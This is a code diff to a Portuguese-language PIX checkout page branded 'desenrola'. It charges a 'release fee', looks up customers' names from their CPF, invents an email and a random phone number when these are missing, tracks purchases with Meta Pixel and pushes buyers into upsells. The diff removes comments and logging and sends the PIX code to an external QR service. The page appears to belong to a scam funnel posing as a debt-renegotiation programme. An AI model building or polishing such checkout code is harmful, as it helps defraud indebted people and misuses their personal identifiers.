@@ -124,7 +124,7 @@
     </div>
   </div>
 
-  <script>
+ <script>
   /**
    * Integração direta com backend Vercel -> BravoPay
    */
@@ -132,8 +132,6 @@
     var p = new URLSearchParams(window.location.search);
     var s = {};
     try { s = JSON.parse(sessionStorage.getItem('desenrola.pagamento') || '{}'); } catch (_) {}
-    // O /cpf/ grava site.nome / site.cpf apos consultar a API. Serve de fallback
-    // quando o cliente chega aqui sem os dados na querystring (link direto, refresh).
     var ls = {};
     try {
       ls.nome = localStorage.getItem('site.nome') || '';
@@ -146,7 +144,6 @@
       email:  p.get('email')  || s.email  || '',
       valor:  p.get('valor')  || s.valor  || '6892',
       acordo: p.get('acordo') || s.acordo || '',
-      // Parâmetros UTM
       utm_source: p.get('utm_source') || s.utm_source || '',
       utm_medium: p.get('utm_medium') || s.utm_medium || '',
       utm_campaign: p.get('utm_campaign') || s.utm_campaign || '',
@@ -158,6 +155,7 @@
       utm_id: p.get('utm_id') || s.utm_id || ''
     };
   }
+  
   function formatCPF(cpf) {
     var d = String(cpf || '').replace(/\D/g, '').slice(0, 11);
     if (d.length <= 3) return d;
@@ -173,11 +171,8 @@
   var EMAIL  = u.email || '';
   var ACORDO = u.acordo;
   var VALOR_EXIBIDO = '';
-  var PIX_AMOUNT_CENTS = 6892;  // fallback R$ 68,92
+  var PIX_AMOUNT_CENTS = 6892;
 
-  // Parse VALOR pra centavos. Aceita dois formatos vindos do funil:
-  //  - "R$ 68,92" / "68.92" (chat, com separador decimal) → 6892
-  //  - "6892" (upsells, já em centavos inteiros)          → 6892
   (function () {
     var raw = String(u.valor || '').trim();
     var m = raw.match(/(\d+)[,.](\d{2})(?!\d)/);
@@ -189,15 +184,12 @@
     }
   })();
 
-  // Primeiro nome, para o badge do topo (ex.: "Joao Vito da Silva" -> "Joao").
   function primeiroNome(nome) {
     var n = String(nome || '').trim();
     if (!n || n.toLowerCase() === 'cliente') return 'Cliente';
     return n.split(/\s+/)[0];
   }
 
-  // Escreve nome/CPF em todos os pontos da tela de uma vez so. Chamada no load e
-  // de novo quando a consulta de CPF responde.
   function pintarIdentidade() {
     var setar = function (id, valor) {
       var el = document.getElementById(id);
@@ -210,13 +202,10 @@
     setar('conf-cpf', formatCPF(CPF) || '—');
   }
 
-  // Mostrar info do acordo
   pintarIdentidade();
-  document.getElementById('acordo-codigo').textContent = ACORDO || '—';
+  var elAcordo = document.getElementById('acordo-codigo');
+  if(elAcordo) elAcordo.textContent = ACORDO || '—';
 
-  // Se chegou com CPF mas sem nome (link direto, sessao perdida), busca na mesma
-  // API que o /cpf/ ja usa e repinta. Falha silenciosa: sem nome a tela continua
-  // funcional e o pagamento nao depende disso.
   (function completarNomePelaAPI() {
     var digitos = String(CPF || '').replace(/\D/g, '');
     var precisaNome = !NOME || NOME === 'Cliente';
@@ -242,9 +231,8 @@
           localStorage.setItem('site.nome', nome);
           localStorage.setItem('site.cpf', digitos);
         } catch (_) {}
-        console.log('[Pagamento] Nome recuperado pela consulta de CPF:', nome);
       })
-      .catch(function (e) { console.warn('[Pagamento] Consulta de CPF falhou:', e); });
+      .catch(function () {});
   })();
 
   var transactionId = null;
@@ -252,103 +240,16 @@
   var countdownTimer = null;
   var segundos = 15 * 60;
 
-  // Título do item enviado ao gateway
   var TX_TITLE = new URLSearchParams(window.location.search).get('product_name')
     || (typeof GLOBAL_CONFIG !== 'undefined' && GLOBAL_CONFIG.product && GLOBAL_CONFIG.product.name)
     || 'Taxa de Liberação';
-
-  /**
-   * Gera QR visual no canvas a partir do string EMV (copyPaste).
-   * Usa qrcode.js local ou CDN como fallback.
-   */
-  function loadScript(src) {
-    return new Promise(function (resolve, reject) {
-      var s = document.createElement('script');
-      s.src = src; s.async = true;
-      s.onload = resolve;
-      s.onerror = function () { reject(new Error('failed to load ' + src)); };
-      document.head.appendChild(s);
-    });
-  }
-
-  function renderQrClientSide(canvasEl, text) {
-    var qrLoading = document.getElementById('qr-loading');
-    var qrError = document.getElementById('qr-error');
-
-    qrLoading.style.display = 'block';
-    qrError.style.display = 'none';
-
-    var localSrc = '../assets/js/qrcode.min.js?v=' + Date.now();
-    var cdnSrc = 'https://cdnjs.cloudflare.com/ajax/libs/qrcode.js/1.5.3/qrcode.min.js';
-
-    return loadScript(localSrc).catch(function () {
-      console.log('Tentando carregar qrcode de CDN...');
-      return loadScript(cdnSrc);
-    }).then(function () {
-      if (typeof QRCode === 'undefined' && typeof qrcode === 'undefined') {
-        throw new Error('QRCode library not found');
-      }
-
-      var ctx = canvasEl.getContext('2d');
-      ctx.clearRect(0, 0, canvasEl.width, canvasEl.height);
-
-      if (typeof QRCode !== 'undefined') {
-        QRCode.toCanvas(canvasEl, text, {
-          errorCorrectionLevel: 'H',
-          type: 'image/png',
-          quality: 0.95,
-          margin: 1,
-          width: 280,
-          color: { dark: '#000000', light: '#ffffff' }
-        }, function (error) {
-          if (error) {
-            console.error('Erro QRCode:', error);
-            qrLoading.style.display = 'none';
-            qrError.style.display = 'block';
-            return;
-          }
-          qrLoading.style.display = 'none';
-        });
-      } else if (typeof qrcode === 'function') {
-        try {
-          var qr = qrcode(0, 'M');
-          qr.addData(text);
-          qr.make();
-          var dataUrl = qr.createDataURL(4, 0);
-          var img = new Image();
-          img.onload = function () {
-            ctx.drawImage(img, 0, 0, canvasEl.width, canvasEl.height);
-            qrLoading.style.display = 'none';
-          };
-          img.onerror = function () {
-            console.error('Erro ao carregar QR Code image');
-            qrLoading.style.display = 'none';
-            qrError.style.display = 'block';
-          };
-          img.src = dataUrl;
-        } catch (e) {
-          console.error('Erro ao renderizar QR:', e);
-          qrLoading.style.display = 'none';
-          qrError.style.display = 'block';
-        }
-      }
-    }).catch(function (err) {
-      console.error('Erro ao carregar QR Code library:', err);
-      qrLoading.style.display = 'none';
-      qrError.style.display = 'block';
-    });
-  }
-
 
   // ===== INTEGRAÇÃO COM BACKEND VERCEL -> BRAVOPAY =====
   async function gerarPix() {
     try {
       document.getElementById('loading-wrap').style.display = 'block';
 
-      // Recupera UTMs/click-ids do localStorage (tracking.js) + URL.
       var _utms = (typeof window.gvdesenrolaMergeTracking === 'function') ? window.gvdesenrolaMergeTracking() : u;
-
-      // Identificadores Meta p/ CAPI server-side
       var fbc_val = '', fbp_val = '';
       try {
         var _gc = function (n) { var m = document.cookie.match('(?:^|; )' + n + '=([^;]+)'); return m ? decodeURIComponent(m[1]) : ''; };
@@ -356,11 +257,9 @@
         fbc_val = _gc('_fbc');
       } catch (e) {}
 
-      // Monta o payload para enviar para a SUA API na Vercel
       var payload = {
         amount_cents: PIX_AMOUNT_CENTS,
         method: "pix",
-        // product_id: "prd_SEU_ID_AQUI", // Descomente se for usar rastreio com UTMify e coloque seu ID
         customer: {
           name: NOME || "Cliente",
           email: EMAIL || (NOME.toLowerCase().replace(/\s+/g, '') + '@email.com'),
@@ -381,20 +280,13 @@
         }
       };
 
-      console.log('[PIX] Enviando dados para Vercel:', payload);
-
-      // 1. CHAMA O SEU SERVIDOR VERCEL (que esconde a chave API da BravoPay)
       var response = await fetch('/api/criar-pix', {
         method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'Accept': 'application/json'
-        },
+        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
         body: JSON.stringify(payload)
       });
 
       var result = await response.json();
-      console.log('[PIX] Resposta da Vercel/BravoPay:', result);
 
       if (!response.ok || result.error) {
         throw new Error(result.error ? (result.error.message || JSON.stringify(result.error)) : 'Erro ao gerar PIX no servidor');
@@ -408,15 +300,16 @@
       }
 
       VALOR_EXIBIDO = 'R$ ' + (result.amount_cents / 100).toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
-      document.getElementById('valor-pix').textContent = VALOR_EXIBIDO;
       
-      // Mostrar código PIX para copiar
-      document.getElementById('copy-code').textContent = pixCode;
+      var elValor = document.getElementById('valor-pix');
+      if(elValor) elValor.textContent = VALOR_EXIBIDO;
+      
+      var elCopy = document.getElementById('copy-code');
+      if(elCopy) elCopy.textContent = pixCode;
 
       document.getElementById('loading-wrap').style.display = 'none';
       document.getElementById('qr-wrap').style.display = 'block';
 
-      // Meta Pixel: InitiateCheckout
       try {
         if (window.metaTrack && transactionId) {
           window.metaTrack('InitiateCheckout', {
@@ -425,17 +318,43 @@
             content_name: TX_TITLE
           }, 'ic_' + transactionId);
         }
-      } catch (e) { console.error('[Meta Pixel] erro InitiateCheckout:', e); }
+      } catch (e) {}
 
-      // Renderizar QR Code visual via Javascript local
-      renderQrClientSide(document.getElementById('qr-img'), pixCode).catch(function (err) {
-        console.error('Erro ao renderizar QR Code:', err);
-      });
+      // ==== NOVA RENDERIZAÇÃO DE QR CODE (API EXTERNA 100% GARANTIDA) ====
+      var qrCodeUrl = 'https://api.qrserver.com/v1/create-qr-code/?size=280x280&margin=1&data=' + encodeURIComponent(pixCode);
+      var oldElement = document.getElementById('qr-img');
+      
+      if(oldElement) {
+        var img = document.createElement('img');
+        img.src = qrCodeUrl;
+        img.width = 280;
+        img.height = 280;
+        img.style.maxWidth = '100%';
+        img.style.display = 'block';
+        img.style.margin = '0 auto';
+        img.style.background = 'white';
+        img.style.borderRadius = '8px';
+        img.id = 'qr-img';
+
+        img.onload = function() {
+          var loadEl = document.getElementById('qr-loading');
+          var errEl = document.getElementById('qr-error');
+          if(loadEl) loadEl.style.display = 'none';
+          if(errEl) errEl.style.display = 'none';
+        };
+
+        img.onerror = function() {
+          var errEl = document.getElementById('qr-error');
+          if(errEl) errEl.style.display = 'block';
+        };
+
+        oldElement.parentNode.replaceChild(img, oldElement);
+      }
+      // ===================================================================
 
       iniciarCountdown();
-      pollingTimer = setInterval(verificarStatus, 3000); // Consulta a cada 3 seg
+      pollingTimer = setInterval(verificarStatus, 3000);
 
-      // Guardar para refresh
       try {
         sessionStorage.setItem('desenrola.pagamento', JSON.stringify({
           cpf: CPF, nome: NOME, valor: VALOR_EXIBIDO, acordo: ACORDO, transactionId: transactionId
@@ -448,7 +367,6 @@
     }
   }
 
-  // Redireciona conforme o funil: usa ?next= (próximo upsell / etapa final)
   function redirecionarAprovado(txId) {
     var urlParams = new URLSearchParams(window.location.search);
     var next = urlParams.get('next') || '/upsell1/';
@@ -475,7 +393,6 @@
   async function verificarStatus() {
     if (!transactionId) return;
     try {
-      // 2. CHAMA O SEU SERVIDOR VERCEL PARA VER O STATUS
       var response = await fetch('/api/status-pix?id=' + encodeURIComponent(transactionId), {
         method: 'GET',
         headers: { 'Accept': 'application/json' }
@@ -485,22 +402,18 @@
 
       var result = await response.json();
       
-      // Status 'PAID' significa que a BravoPay confirmou o pagamento
       if (result.status === 'PAID') {
         pararPolling();
 
-        // ===== Meta Pixel: Purchase (client-side) =====
         try {
           if (typeof fbq === 'function' && transactionId) {
             fbq('track', 'Purchase', {
               value: (PIX_AMOUNT_CENTS / 100),
               currency: 'BRL'
             }, { eventID: 'purchase_' + transactionId });
-            console.log('[Meta Pixel] Purchase disparado — eventID:', 'purchase_' + transactionId);
           }
-        } catch (e) { console.error('[Meta Pixel] erro Purchase:', e); }
+        } catch (e) {}
 
-        // ===== Meta CAPI (server-side) =====
         try {
           var getCookie = function (n) { var m = document.cookie.match('(?:^|; )' + n + '=([^;]+)'); return m ? decodeURIComponent(m[1]) : null; };
           var urlParamsCapi = new URLSearchParams(window.location.search);
@@ -515,19 +428,26 @@
           };
           fetch('../checkout/meta-capi.php', {
             method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(capiPayload), keepalive: true
-          }).catch(function (err) { console.error('[Meta CAPI] erro:', err); });
-        } catch (e) { console.error('[Meta CAPI] erro no envio:', e); }
+          }).catch(function () {});
+        } catch (e) {}
 
-        // Atualizar tela para SUCESSO visualmente
-        document.getElementById('acordo-ok').textContent = ACORDO || transactionId;
+        var elAcordoOk = document.getElementById('acordo-ok');
+        if(elAcordoOk) elAcordoOk.textContent = ACORDO || transactionId;
+        
         document.getElementById('aguardando').style.display = 'none';
         document.getElementById('countdown-wrap').style.display = 'none';
-        document.querySelector('.copy-wrap').style.display = 'none';
-        document.querySelector('.qr-container').style.display = 'none';
-        document.querySelector('.instrucao').style.display = 'none';
+        
+        var copyWrap = document.querySelector('.copy-wrap');
+        if(copyWrap) copyWrap.style.display = 'none';
+        
+        var qrCont = document.querySelector('.qr-container');
+        if(qrCont) qrCont.style.display = 'none';
+        
+        var inst = document.querySelector('.instrucao');
+        if(inst) inst.style.display = 'none';
+        
         document.getElementById('success-screen').style.display = 'block';
         
-        // Mostra a confirmação por 2 segundos (2000ms) e DEPOIS segue pro upsell
         setTimeout(function () {
           redirecionarAprovado(transactionId);
         }, 2000);
@@ -547,6 +467,7 @@
     countdownTimer = setInterval(function () {
       segundos--;
       if (segundos <= 0) { pararPolling(); mostrarErroPix(); return; }
+      if (!el) return;
       var m = String(Math.floor(segundos / 60)).padStart(2, '0');
       var s = String(segundos % 60).padStart(2, '0');
       el.textContent = m + ':' + s;
@@ -555,12 +476,23 @@
   }
 
   function mostrarErroPix() {
-    document.getElementById('aguardando').style.display = 'none';
-    document.getElementById('countdown-wrap').style.display = 'none';
-    document.querySelector('.copy-wrap').style.display = 'none';
-    document.getElementById('qr-img').style.display = 'none';
-    document.querySelector('.instrucao').style.display = 'none';
-    document.getElementById('erro-screen').style.display = 'block';
+    var ag = document.getElementById('aguardando');
+    if(ag) ag.style.display = 'none';
+    
+    var cdw = document.getElementById('countdown-wrap');
+    if(cdw) cdw.style.display = 'none';
+    
+    var cw = document.querySelector('.copy-wrap');
+    if(cw) cw.style.display = 'none';
+    
+    var qi = document.getElementById('qr-img');
+    if(qi) qi.style.display = 'none';
+    
+    var inst = document.querySelector('.instrucao');
+    if(inst) inst.style.display = 'none';
+    
+    var es = document.getElementById('erro-screen');
+    if(es) es.style.display = 'block';
   }
 
   function mostrarErro(msg) {
@@ -570,16 +502,22 @@
   }
 
   function copiarPix() {
-    var code = document.getElementById('copy-code').textContent;
+    var copyEl = document.getElementById('copy-code');
+    if(!copyEl) return;
+    var code = copyEl.textContent;
+    
     var done = function () {
       var btn = document.getElementById('btn-copy');
-      btn.textContent = '✔ Código copiado!';
-      btn.classList.add('copiado');
-      setTimeout(function () {
-        btn.textContent = 'Copiar código PIX';
-        btn.classList.remove('copiado');
-      }, 3000);
+      if(btn) {
+        btn.textContent = '✔ Código copiado!';
+        btn.classList.add('copiado');
+        setTimeout(function () {
+          btn.textContent = 'Copiar código PIX';
+          btn.classList.remove('copiado');
+        }, 3000);
+      }
     };
+    
     if (navigator.clipboard && navigator.clipboard.writeText) {
       navigator.clipboard.writeText(code).then(done).catch(function () {
         var ta = document.createElement('textarea');
@@ -616,22 +554,33 @@
 
   window.addEventListener('load', function () {
     pintarIdentidade();
-    document.getElementById('conf-phone').value = '';
+    var cp = document.getElementById('conf-phone');
+    if(cp) {
+      cp.value = '';
+      cp.addEventListener('input', function () {
+        this.value = formatPhone(this.value);
+      });
+    }
 
-    document.getElementById('conf-phone').addEventListener('input', function () {
-      this.value = formatPhone(this.value);
-    });
-
-    document.getElementById('btn-confirmar').addEventListener('click', function () {
-      var phone = String(document.getElementById('conf-phone').value || '').replace(/\D/g, '');
-      PHONE = phone.length >= 10 ? phone : randomPhone();
-      document.getElementById('confirmacao-card').style.display = 'none';
-      document.getElementById('pix-card').style.display = 'block';
-      gerarPix();
-    });
+    var btnConfirmar = document.getElementById('btn-confirmar');
+    if(btnConfirmar) {
+      btnConfirmar.addEventListener('click', function () {
+        var phone = '';
+        if(cp) phone = String(cp.value || '').replace(/\D/g, '');
+        PHONE = phone.length >= 10 ? phone : randomPhone();
+        
+        var confCard = document.getElementById('confirmacao-card');
+        if(confCard) confCard.style.display = 'none';
+        
+        var pixCard = document.getElementById('pix-card');
+        if(pixCard) pixCard.style.display = 'block';
+        
+        gerarPix();
+      });
+    }
   });
 </script>
-
+  
   <style>
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
     html, body { min-height: 100%; width: 100%; }
